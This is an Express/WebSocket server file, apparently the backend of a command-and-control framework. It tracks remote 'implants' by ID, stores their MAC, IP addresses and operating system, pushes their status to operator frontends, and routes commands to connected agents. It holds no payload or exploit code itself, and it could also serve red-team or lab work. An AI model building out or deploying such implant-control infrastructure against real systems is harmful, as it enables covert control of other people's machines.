import express from 'express'
import { configDotenv } from 'dotenv';
import authRouter from './routes/auth_routes.mjs';
import helmet from 'helmet';
import { syntax_errors, type_errors } from './middlewares/json_errors.mjs';
import db_connection from './database/config.mjs';
import { WebSocketServer } from 'ws';
import http from 'http'
import cmd_router from './routes/cmd_routes.mjs';
import implant_router from './routes/implant_routes.mjs';
import Implant from './models/Implant_model.mjs';
import cors from 'cors'



const webSocketsServer = async (httpServer) => {
  try {
    const server = new WebSocketServer({ server: httpServer });
    const agents = new Map();   // Mapa de agents conectados (por ID)
    const users = new Set();  // Set de users conectados (frontends)

    server.on('connection', (socket, request) => {
      const url = new URL(request.url, `http://${request.headers.host}`);
      const clientId = url.searchParams.get('id');
      const rol = url.searchParams.get('rol');

      // Si es usuario (frontend)
      if (rol === 'usuario') {      //cvalidacion de token
        console.log('Usuario conectado (frontend)');
        users.add(socket);

        socket.on('close', () => {
          console.log('Usuario desconectado');
          users.delete(socket);
        });

        return;
      }

      // Si es agente
      if (!clientId) {
        console.log("Cliente sin ID, cerrando");
        socket.close();
        return;
      }

      if (agents.has(clientId)) {
        console.log(`Agente ${clientId} ya conectado. Reemplazando conexión.`);
        agents.get(clientId).terminate();
      }

      console.log(`Agente conectado con ID: ${clientId}`);
      agents.set(clientId, socket);
      socket.isAlive = true;

      socket.on('pong', () => socket.isAlive = true);

/*       socket.on('message', (data) => {  //validar token de usuario
        try {
          const msg = JSON.parse(data);


        } catch (e) {
          console.error('Error procesando mensaje:', e);
        }
      }); */

      socket.on('close', () => {
        console.log(`Agente ${clientId} desconectado`);
        agents.delete(clientId);
      });
    });

    // Intervalo para verificar estado de los agents y notificar users
    const interval = setInterval(async () => {
      const db_clients = await Implant.find(); // Asumo que `clients` es una colección de DB
      const client_db_list = db_clients.map(x => x);
      const status_connections = [];

      client_db_list.forEach((c) => {
        const ws = agents.get(c.impl_id);
        if (ws) {
          if (ws.isAlive) {
            status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          } else {
            status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          }
        } else {
          status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
        }
      });



      // Enviar estados a todos los users conectados
      const payload = {
        data: status_connections
      };

      
    // Reenviar a todos los users
    users.forEach(userSocket => {
      if (userSocket.readyState === userSocket.OPEN) {
        userSocket.send(JSON.stringify(status_connections));
      }
    });
    }, 5000);

    server.on("close", () => clearInterval(interval));

    return { agents, users };

  } catch (error) {
    console.error('Error en WebSocket server:', error);
    return false;
  }
};


const main = async () =>{
    
    configDotenv();
    const app = express();
    await db_connection();
    app.use(cors());
    
    app.use(helmet())
    
    app.use(express.json())
    app.use(express.urlencoded({ extended: true })); // Para formularios HTML
    app.use(express.static('public'));
    const server = http.createServer(app);
    const {agents} = await webSocketsServer(server)
    
    app.use('/api/auth', authRouter)
    app.use('/api/rcv', cmd_router(agents))
    app.use('/api/impl', implant_router())
    //------Type errors-----
    app.use(type_errors);
    app.use(syntax_errors);
    
    server.listen(process.env.PORT, ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))

}
main()